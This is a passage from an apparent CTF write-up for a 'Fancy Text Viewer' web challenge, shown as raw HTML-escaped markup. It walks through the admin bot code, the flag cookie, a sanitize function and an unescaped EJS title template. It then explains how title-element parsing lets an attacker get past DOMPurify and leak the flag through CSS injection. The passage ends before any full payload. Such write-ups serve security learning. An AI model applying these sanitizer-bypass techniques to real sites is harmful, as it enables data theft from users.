style=\"--0:#FFAB70\">url\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">password\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">console.\u003C/span>\u003Cspan style=\"--0:#B392F0\">log\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">`Requesting ${\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">url\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">}`\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">try\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">browser\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">await\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> puppeteer.\u003C/span>\u003Cspan style=\"--0:#B392F0\">launch\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">({\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">args: [\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"--no-sandbox\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"--disable-gpu\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"--js-flags=--noexpose_wasm,--jitless\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">],\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">executablePath: \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/usr/bin/google-chrome\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">});\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">let\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> page \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">await\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> browser.\u003C/span>\u003Cspan style=\"--0:#B392F0\">newPage\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">await\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> page.\u003C/span>\u003Cspan style=\"--0:#B392F0\">goto\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">CHALL_URL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/login?secret=\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> password);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">await\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">sleep\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1000\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">await\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> page.\u003C/span>\u003Cspan style=\"--0:#B392F0\">close\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">await\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">sleep\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">100\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">page \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">await\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> browser.\u003C/span>\u003Cspan style=\"--0:#B392F0\">newPage\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">await\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> page.\u003C/span>\u003Cspan style=\"--0:#B392F0\">goto\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(url);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">await\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">sleep\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">10000\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">await\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> page.\u003C/span>\u003Cspan style=\"--0:#B392F0\">close\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">await\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">sleep\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">100\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">} \u003C/span>\u003Cspan style=\"--0:#F97583\">catch\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (e) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">console.\u003C/span>\u003Cspan style=\"--0:#B392F0\">log\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">`Request Failed (${\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">url\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">})`\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"import puppeteer from &#x22;puppeteer&#x22;;const sleep = (milliseconds) => {  return new Promise((resolve) => setTimeout(resolve, milliseconds));};const CHALL_URL = &#x22;http://127.0.0.1:4444&#x22;;export default async function bot_goto(url, password) {  console.log(&#x60;Requesting ${url}&#x60;);  try {    const browser = await puppeteer.launch({      args: [        &#x22;--no-sandbox&#x22;,        &#x22;--disable-gpu&#x22;,        &#x22;--js-flags=--noexpose_wasm,--jitless&#x22;,      ],      executablePath: &#x22;/usr/bin/google-chrome&#x22;,    });    let page = await browser.newPage();    await page.goto(CHALL_URL + &#x22;/login?secret=&#x22; + password);    await sleep(1000);    await page.close();    await sleep(100);    page = await browser.newPage();    await page.goto(url);    await sleep(10000);    await page.close();    await sleep(100);  } catch (e) {    console.log(&#x60;Request Failed (${url})&#x60;);  }}\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Looking at the \u003Ccode>/login\u003C/code> route again more closely,\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"js\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">app.\u003C/span>\u003Cspan style=\"--0:#B392F0\">get\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/login\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, (\u003C/span>\u003Cspan style=\"--0:#FFAB70\">req\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">res\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">secret\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> req.query.secret \u003C/span>\u003Cspan style=\"--0:#F97583\">||\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (secret \u003C/span>\u003Cspan style=\"--0:#F97583\">!==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">ADMIN_PASSWORD\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">res.\u003C/span>\u003Cspan style=\"--0:#B392F0\">status\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">401\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">).\u003C/span>\u003Cspan style=\"--0:#B392F0\">send\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"login fail\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">} \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">res.\u003C/span>\u003Cspan style=\"--0:#B392F0\">cookie\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"username\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"ADMIN\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">res.\u003C/span>\u003Cspan style=\"--0:#B392F0\">cookie\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"flag\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">FLAG\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, { httpOnly: \u003C/span>\u003Cspan style=\"--0:#79B8FF\">true\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> });\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">res.\u003C/span>\u003Cspan style=\"--0:#B392F0\">redirect\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">});\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"app.get(&#x22;/login&#x22;, (req, res) => {  const secret = req.query.secret || &#x22;&#x22;;  if (secret !== ADMIN_PASSWORD) {    res.status(401).send(&#x22;login fail&#x22;);  } else {    res.cookie(&#x22;username&#x22;, &#x22;ADMIN&#x22;);    res.cookie(&#x22;flag&#x22;, FLAG, { httpOnly: true });    res.redirect(&#x22;/&#x22;);  }});\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>We can see that the if a user successfully logs in with the correct \u003Ccode>ADMIN_PASSWORD\u003C/code>, they will be given the flag in a cookie. The admin bot that we see correctly knows this password, and will log in as the admin. The admin bot will then visit any page we give it. Its clear that we need to somehow get the flag by some means.\u003C/p>\n\u003Ch3 id=\"solution-1\">\u003Ca href=\"#solution-1\">Solution\u003C/a>\u003C/h3>\n\u003Cp>So there are a few initial observations that are helpful in this challenge. First overall there isn’t actually much you can control. The admin bot will have its username and flag cookie set on its own, but the only other input is the \u003Ccode>sharedby\u003C/code> param in the \u003Ccode>/\u003C/code> page. There is also a pretty suspicious \u003Ccode>sanitize\u003C/code> function which clearly very relevant to the challenge.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"js\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">function\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">sanitize\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#FFAB70\">str\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">str \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> str.\u003C/span>\u003Cspan style=\"--0:#B392F0\">replace\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">/\u003C/span>\u003Cspan style=\"--0:#79B8FF\">[\u003C/span>\u003Cspan style=\"--0:#F97583\">^\u003C/span>\u003Cspan style=\"--0:#79B8FF\">(0-Z. )]\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">/\u003C/span>\u003Cspan style=\"--0:#F97583\">g\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> DOMPurify.\u003C/span>\u003Cspan style=\"--0:#B392F0\">sanitize\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(str);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"function sanitize(str) {  str = str.replace(/[^(0-Z. )]/g, &#x22;&#x22;);  return DOMPurify.sanitize(str);}\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>The \u003Ccode>sharedby\u003C/code> param that we pass will be filtered, then sanitized by \u003Ccode>DOMPurify.sanitize\u003C/code>. Note this means that the character set is 0-9, A-Z, dot, space, and some special characters between 0x3A and 0x40 (\u003Ccode>:;&#x3C;=>?@\u003C/code>).\u003C/p>\n\u003Cp>Additionally this parameter is not sanitized when it is passed to the \u003Ccode>index.ejs\u003C/code> file.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"html\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">title\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">Fancy Text Viewer \u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">% if (sharedby) { %> | Shared by \u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">%- sharedby %> \u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">% } %>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">title\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"\u003Ctitle>  Fancy Text Viewer \u003C% if (sharedby) { %> | Shared by \u003C%- sharedby %> \u003C% } %>\u003C/title>\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Second, note that even though the flag cookie is HTTPOnly, its actually present in the DOM. You can determine how it looks by simply setting your own flag cookie and seeing how the server renders the dialog, or noticing it in the \u003Ccode>index.ejs\u003C/code> file:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"html\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">p\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">Oh? You seem to have a flag! You can view it\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">a\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">href\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"view?content=\u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">%- flag %>\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>here&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">a\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>!\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">p\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"\u003Cp>  Oh? You seem to have a flag! You can view it  \u003Ca href=&#x22;view?content=\u003C%- flag %>&#x22;>here\u003C/a>!\u003C/p>\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>With this, note that XSS is not necessary to solve this challenge, but a leak via CSS Injection is sufficient.\u003C/p>\n\u003Cp>Which brings us to the main part of the challenge, how do you get CSS Injection? The main idea here is that the browser parses the \u003Ccode>&#x3C;title>\u003C/code> a bit differently. Try this in a browser console:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"js\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">document.\u003C/span>\u003Cspan style=\"--0:#B392F0\">write\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"&#x3C;head>&#x3C;title>&#x3C;title>&#x3C;/title>&#x3C;/head>\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"document.write(&#x22;\u003Chead>\u003Ctitle>\u003Ctitle>\u003C/title>\u003C/head>&#x22;);\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Notice if you inspect the HTML in the browser, the inner \u003Ccode>title\u003C/code> tag is actually automatically escaped.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"html\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">title\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;lt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">title\u003C/span>\u003Cspan style=\"--0:#79B8FF\">&#x26;gt;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">title\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"\u003Ctitle>&#x26;lt;title&#x26;gt;\u003C/title>\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>The DOMPurify context of the \u003Ccode>sharedby\u003C/code> variable is different than the actual browser, and the DOMPurify sanitization context is not expected to be in this context.\u003C/p>\n\u003Cp>It should be known that one thing that DOMPurify also does is Prevent Structural Damage:\u003C/p>\n\u003Cblockquote>\n\u003Cp>The HTML string or document returned by DOMPurify is sane HTML and doesn’t miss closing tags or other bits that might ruin your website’s structure or even leak data. If you find a way to do that anyway, it’s a bug and we will fix it. Please let us know. (\u003Ca 